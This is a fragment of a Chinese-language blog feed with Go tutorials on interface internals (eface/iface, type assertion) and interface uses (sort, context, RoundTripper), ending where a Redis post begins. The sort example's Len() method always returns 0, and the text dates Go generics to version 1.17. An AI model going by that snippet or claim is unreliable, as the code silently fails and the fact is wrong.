class="literal">nil</span></span><br><span class="line">InterfaceTest(v)</span><br><span class="line">fmt.Println(<span class="string">""</span>)</span><br><span class="line">InterfaceTest2(v)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行main方法，查看输出结果发现：InterfaceTest2是符合预期的。从InterfaceTest的输出来看，v是nil，但不完全为nil，经过interface转换之后发生了什么？</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="literal">nil</span>&gt;</span><br><span class="line">v is not <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="literal">nil</span>&gt;</span><br><span class="line">v is <span class="literal">nil</span></span><br></pre></td></tr></tbody></table></figure><h3 id="interface底层结构"><a href="#interface底层结构" class="headerlink" title="interface底层结构"></a>interface底层结构</h3><p>interface判断与预期不一样的根本原因，interface根本不是那么简简单单，而是两个struct。什么？interface不是单纯的值？是struct，还是两个？</p><p><img src="https://i.loli.net/2021/07/16/zLr4R9OBxoVdsGw.jpg" alt="e18d20c94006dfe0-9eef65073f0f6be0-d9c854df534cf3bd0dca74a7e620249c.jpeg"></p><p>根据interface是否包含method，底层实现上有两种struct：eface，iface</p><ul><li><p>eface表示不包含任何方法的空接口，也称为 empty interface。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> eface <span class="keyword">struct</span> {</span><br><span class="line">    _type *_type <span class="comment">// 指向类型信息</span></span><br><span class="line">    data  unsafe.Pointer <span class="comment">// 指向值信息</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> _type <span class="keyword">struct</span> {</span><br><span class="line">    size       <span class="type">uintptr</span> <span class="comment">// 类型的大小</span></span><br><span class="line">    ptrdata    <span class="type">uintptr</span> <span class="comment">// 所有指针的内存前缀大小</span></span><br><span class="line">    hash       <span class="type">uint32</span>  <span class="comment">// 类型的hash值。此处提前计算好，可以避免在哈希表中计算</span></span><br><span class="line">    tflag      tflag   <span class="comment">// 额外的类型信息标志。此处为类型的 flag 标志，主要用于反射</span></span><br><span class="line">    align      <span class="type">uint8</span>   <span class="comment">// 对应变量与该类型的内存对齐大小。</span></span><br><span class="line">    fieldalign <span class="type">uint8</span>   <span class="comment">// 对应类型的结构体的内存对齐大小。</span></span><br><span class="line">    kind       <span class="type">uint8</span>   <span class="comment">// 类型的枚举值。包含 Go 语言中的所有类型，例如：kindBool、kindInt、kindInt8、kindInt16 等。</span></span><br><span class="line">    alg        *typeAlg  <span class="comment">// algorithm table</span></span><br><span class="line">    gcdata    *<span class="type">byte</span>    <span class="comment">// 存储垃圾收集器的 GC 类型数据</span></span><br><span class="line">    str       nameOff  <span class="comment">// string form</span></span><br><span class="line">    ptrToThis typeOff  <span class="comment">// type for pointer to this type, may be zero</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>iface包含一些method的具体实现，存在itab.fun变量里</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> iface <span class="keyword">struct</span> {</span><br><span class="line">    tab  *itab</span><br><span class="line">    data unsafe.Pointer</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> itab <span class="keyword">struct</span> {</span><br><span class="line">    inter  *interfacetype <span class="comment">// 接口的类型信息</span></span><br><span class="line">    _type  *_type <span class="comment">// 具体类型信息，这个type和eface里的type是一个东西</span></span><br><span class="line">    link   *itab</span><br><span class="line">    bad    <span class="type">int32</span></span><br><span class="line">    inhash <span class="type">int32</span>      <span class="comment">// has this itab been added to hash?</span></span><br><span class="line">    fun    [<span class="number">1</span>]<span class="type">uintptr</span> <span class="comment">// 底层数组，存储接口的方法集的具体实现的地址，其包含一组函数指针，实现了接口方法的动态分派，且每次在接口发生变更时都会更新</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> interfacetype <span class="keyword">struct</span> {</span><br><span class="line"> typ     _type</span><br><span class="line"> pkgpath name</span><br><span class="line"> mhdr    []imethod</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> imethod <span class="keyword">struct</span> {</span><br><span class="line"> name nameOff</span><br><span class="line"> ityp typeOff</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="类型断言是怎么实现的？"><a href="#类型断言是怎么实现的？" class="headerlink" title="类型断言是怎么实现的？"></a>类型断言是怎么实现的？</h3><ul><li><p>断言分为安全和非安全两种</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAssert</span><span class="params">(v <span class="keyword">interface</span>{})</span></span> {</span><br><span class="line">  <span class="comment">// 进行变量断言，若不判断容易出现 panic</span></span><br><span class="line">s := v.(<span class="type">string</span>)</span><br><span class="line"><span class="comment">// 进行安全断言</span></span><br><span class="line">  s, ok := v.(<span class="type">string</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myAssert</span><span class="params">(v <span class="keyword">interface</span>{})</span></span> {</span><br><span class="line">  <span class="comment">// 进行 switch 断言</span></span><br><span class="line">  <span class="keyword">switch</span> v.(<span class="keyword">type</span>) {</span><br><span class="line">  <span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">      <span class="comment">// do something</span></span><br><span class="line">  <span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">      <span class="comment">// do something</span></span><br><span class="line">  <span class="keyword">case</span> <span class="type">float64</span>:</span><br><span class="line">      <span class="comment">// do something</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>iface和eface对应不同的方法，安全和不安全也对应两种方法。(runtime包iface.go)</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">assertI2I</span><span class="params">(inter *interfacetype, i iface)</span></span> (r iface) {</span><br><span class="line">tab := i.tab</span><br><span class="line"><span class="keyword">if</span> tab == <span class="literal">nil</span> {</span><br><span class="line"><span class="comment">// explicit conversions require non-nil interface value.</span></span><br><span class="line"><span class="built_in">panic</span>(&amp;TypeAssertionError{<span class="literal">nil</span>, <span class="literal">nil</span>, &amp;inter.typ, <span class="string">""</span>})</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> tab.inter == inter {</span><br><span class="line">r.tab = tab</span><br><span class="line">r.data = i.data</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">r.tab = getitab(inter, tab._type, <span class="literal">false</span>)</span><br><span class="line">r.data = i.data</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">assertI2I</span><span class="params">(inter *interfacetype, i iface)</span></span> (r iface)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">assertE2I2</span><span class="params">(inter *interfacetype, e eface)</span></span> (r iface, b <span class="type">bool</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">assertE2I</span><span class="params">(inter *interfacetype, e eface)</span></span> (r iface)</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://legendtkl.com/2017/07/01/golang-interface-implement/">http://legendtkl.com/2017/07/01/golang-interface-implement/</a></p><p><a href="https://mp.weixin.qq.com/s/vNACbdSDxC9S0LOAr7ngLQ">https://mp.weixin.qq.com/s/vNACbdSDxC9S0LOAr7ngLQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Interface能怎么用?</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-16-Golang-Interface%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Golang-Interface-应用"><a href="#Golang-Interface-应用" class="headerlink" title="Golang Interface 应用"></a>Golang Interface 应用</h2><h3 id="Interface是什么？"><a href="#Interface是什么？" class="headerlink" title="Interface是什么？"></a>Interface是什么？</h3><p>在Golang中，interface是一组method的集合，duck-type programing的一种体现。不关心属性（数据），只关心行为（方法）。可以认为interface是一种协议，一种为了双方交流而做出的约定。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The error built-in interface type is the conventional interface for</span></span><br><span class="line"><span class="comment">// representing an error condition, with the nil value representing no error.</span></span><br><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> {</span><br><span class="line">Error() <span class="type">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------</span></span><br><span class="line"><span class="comment">// 定义自己的err类型</span></span><br><span class="line"><span class="keyword">type</span> MyErr <span class="keyword">struct</span> {}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现error接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *MyErr)</span></span>Error() <span class="type">string</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="string">"my error"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Interface能干什么？"><a href="#Interface能干什么？" class="headerlink" title="Interface能干什么？"></a>Interface能干什么？</h3><ul><li>writing generic algorithm （泛型编程）</li><li>hiding implementation detail （隐藏具体实现）</li><li>providing interception points （提供拦截点）</li></ul><h4 id="writing-generic-algorithm"><a href="#writing-generic-algorithm" class="headerlink" title="writing generic algorithm"></a>writing generic algorithm</h4><p>golang的泛型最早1.17才提供版本支持。用interface实现一下行不行呀？</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sort</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> {</span><br><span class="line">    <span class="comment">// Len is the number of elements in the collection.</span></span><br><span class="line">    Len() <span class="type">int</span></span><br><span class="line">    <span class="comment">// Less reports whether the element with</span></span><br><span class="line">    <span class="comment">// index i should sort before the element with index j.</span></span><br><span class="line">    Less(i, j <span class="type">int</span>) <span class="type">bool</span></span><br><span class="line">    <span class="comment">// Swap swaps the elements with indexes i and j.</span></span><br><span class="line">    Swap(i, j <span class="type">int</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> BestLanguage <span class="keyword">struct</span> {</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Score <span class="type">int</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b BestLanguage)</span></span> String() <span class="type">string</span> {</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">"%s:%d"</span>, b.Name, b.Score)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Languages []BestLanguage</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现了sort的Interface，不知道是怎么排序的，但拥有了排序的能力</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l Languages)</span></span> Len() <span class="type">int</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(Languages{})</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l Languages)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">return</span> l[i].Score &gt; l[j].Score</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l Languages)</span></span> Swap(i, j <span class="type">int</span>) {</span><br><span class="line">l[i], l[j] = l[j], l[i]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">languages := []BestLanguage{</span><br><span class="line">{<span class="string">"Chinese"</span>, <span class="number">5</span>},</span><br><span class="line">{<span class="string">"English"</span>, <span class="number">4</span>},</span><br><span class="line">{<span class="string">"Japanese"</span>, <span class="number">3</span>},</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">fmt.Println(languages)</span><br><span class="line">sort.Sort(Languages(languages))</span><br><span class="line">fmt.Println(languages)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return concrete types, receive interfaces as parameter.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertInterfaceToString</span><span class="params">(v <span class="keyword">interface</span>{})</span></span> <span class="type">string</span> {</span><br><span class="line"><span class="keyword">var</span> vstr <span class="type">string</span></span><br><span class="line"><span class="keyword">switch</span> v.(<span class="keyword">type</span>) {</span><br><span class="line"><span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">vstr = strconv.Itoa(v.(<span class="type">int</span>))</span><br><span class="line"><span class="keyword">case</span> <span class="type">int32</span>:</span><br><span class="line">vstr = strconv.Itoa(<span class="type">int</span>(v.(<span class="type">int32</span>)))</span><br><span class="line"><span class="keyword">case</span> <span class="type">int64</span>:</span><br><span class="line">vstr = strconv.FormatInt(v.(<span class="type">int64</span>), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="type">float64</span>:</span><br><span class="line">vstr = strconv.Itoa(<span class="type">int</span>(v.(<span class="type">float64</span>)))</span><br><span class="line"><span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">vstr = v.(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> vstr</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="hiding-implement-detail"><a href="#hiding-implement-detail" class="headerlink" title="hiding implement detail"></a>hiding implement detail</h4><p>三个函数返回的具体 struct （都实现了 Context interface），但是对于使用者来说是完全无感知的。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Context <span class="keyword">interface</span> {</span><br><span class="line">Deadline() (deadline time.Time, ok <span class="type">bool</span>)</span><br><span class="line">Done() &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>{}</span><br><span class="line">Err() <span class="type">error</span></span><br><span class="line">Value(key <span class="keyword">interface</span>{}) <span class="keyword">interface</span>{}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> cancelCtx <span class="keyword">struct</span> {</span><br><span class="line">Context</span><br><span class="line">mu       sync.Mutex</span><br><span class="line">done     <span class="keyword">chan</span> <span class="keyword">struct</span>{}</span><br><span class="line">children <span class="keyword">map</span>[canceler]<span class="keyword">struct</span>{}</span><br><span class="line">err      <span class="type">error</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithCancel</span><span class="params">(parent Context)</span></span> (ctx Context, cancel CancelFunc)    <span class="comment">//返回 cancelCtx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> timerCtx <span class="keyword">struct</span> {</span><br><span class="line">cancelCtx</span><br><span class="line">timer *time.Timer</span><br><span class="line">deadline time.Time</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithDeadline</span><span class="params">(parent Context, deadline time.Time)</span></span> (Context, CancelFunc) <span class="comment">//返回 timerCtx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> valueCtx <span class="keyword">struct</span> {</span><br><span class="line">Context</span><br><span class="line">key, val <span class="keyword">interface</span>{}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithValue</span><span class="params">(parent Context, key, val <span class="keyword">interface</span>{})</span></span> Context    <span class="comment">//返回 valueCtx</span></span><br></pre></td></tr></tbody></table></figure><h4 id="providing-interception-points"><a href="#providing-interception-points" class="headerlink" title="providing interception points"></a>providing interception points</h4><p>实现RoundTripper接口，可以在http请求前后写入自己的逻辑，如apm，jaeger的打点。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> http</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> RoundTripper <span class="keyword">interface</span> {</span><br><span class="line">RoundTrip(*Request) (*Response, <span class="type">error</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WrapClient</span><span class="params">(c *http.Client)</span></span> *http.Client {</span><br><span class="line"><span class="keyword">if</span> c == <span class="literal">nil</span> {</span><br><span class="line">c = http.DefaultClient</span><br><span class="line">}</span><br><span class="line">copied := *c</span><br><span class="line">copied.Transport = wrapRoundTripper(copied.Transport)</span><br><span class="line"><span class="keyword">return</span> &amp;copied</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">wrapRoundTripper</span><span class="params">(r http.RoundTripper)</span></span> http.RoundTripper {</span><br><span class="line"><span class="keyword">if</span> r == <span class="literal">nil</span> {</span><br><span class="line">r = http.DefaultTransport</span><br><span class="line">}</span><br><span class="line">rt := &amp;roundTripper{r: r}</span><br><span class="line"><span class="keyword">return</span> rt</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> roundTripper <span class="keyword">struct</span> {</span><br><span class="line">r http.RoundTripper</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *roundTripper)</span></span> RoundTrip(req *http.Request) (*http.Response, <span class="type">error</span>) {</span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">  resp, err := r.r.RoundTrip(req) <span class="comment">// real request</span></span><br><span class="line">  <span class="comment">// do something</span></span><br><span class="line">  <span class="keyword">return</span> resp, err</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="值接收-or-指针接收"><a href="#值接收-or-指针接收" class="headerlink" title="值接收 or 指针接收"></a>值接收 or 指针接收</h3><p>实现接口的时候应该用值还是指针？</p><ol><li>赋值时必须用指针。</li><li>初始化为指针类型，编译指定没问题。</li><li>❎表示编译不通过，因为对象没有声明接口的全部方法。</li><li>指针类型没有声明全部，但是能编译通过，因为Go自己做了一些转换。</li></ol><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> {</span><br><span class="line">Eat(food <span class="type">string</span>)</span><br><span class="line">Say()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全部值</span></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> {</span><br><span class="line">food <span class="type">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> Eat(food <span class="type">string</span>) {</span><br><span class="line">d.food = food</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span></span> Say() {</span><br><span class="line">fmt.Println(<span class="string">"dog like "</span>, d.food)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全部指针</span></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> {</span><br><span class="line">food <span class="type">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Cat)</span></span> Eat(food <span class="type">string</span>) {</span><br><span class="line">d.food = food</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Cat)</span></span> Say() {</span><br><span class="line">fmt.Println(<span class="string">"cat like "</span>, d.food)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有值、有指针</span></span><br><span class="line"><span class="keyword">type</span> Fish <span class="keyword">struct</span> {</span><br><span class="line">food <span class="type">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Fish)</span></span> Eat(food <span class="type">string</span>) {</span><br><span class="line">d.food = food</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Fish)</span></span> Say() {</span><br><span class="line">fmt.Println(<span class="string">"fish like "</span>, d.food)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> dog Animal = Dog{}</span><br><span class="line"><span class="keyword">var</span> dog Animal = &amp;Dog{}</span><br><span class="line"><span class="keyword">var</span> dog Animal = <span class="built_in">new</span>(Dog)</span><br><span class="line">dog.Eat(<span class="string">"bone"</span>)</span><br><span class="line">dog.Say()</span><br><span class="line"><span class="comment">// dog like    # 没吃上，赋值失败</span></span><br><span class="line"></span><br><span class="line">❎ <span class="keyword">var</span> cat Animal = Cat{}</span><br><span class="line"><span class="comment">//var cat Animal = &amp;Cat{}</span></span><br><span class="line"><span class="keyword">var</span> cat Animal = <span class="built_in">new</span>(Cat)</span><br><span class="line">cat.Eat(<span class="string">"fish"</span>)</span><br><span class="line">cat.Say()</span><br><span class="line"><span class="comment">// cat like  fish</span></span><br><span class="line"></span><br><span class="line">❎ <span class="keyword">var</span> fish Animal = Fish{}</span><br><span class="line"><span class="keyword">var</span> fish Animal = <span class="built_in">new</span>(Fish)</span><br><span class="line">fish.Eat(<span class="string">"small fish"</span>)</span><br><span class="line">fish.Say()</span><br><span class="line"><span class="comment">// fish like  small fish</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://legendtkl.com/2017/06/12/understanding-golang-interface/">http://legendtkl.com/2017/06/12/understanding-golang-interface/</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-为什么使用跳表?</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-06-21-Redis-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E8%B7%B3%E8%A1%A8/"/>
      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-06-21-Redis-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E8%B7%B3%E8%A1%A8/</url>
      
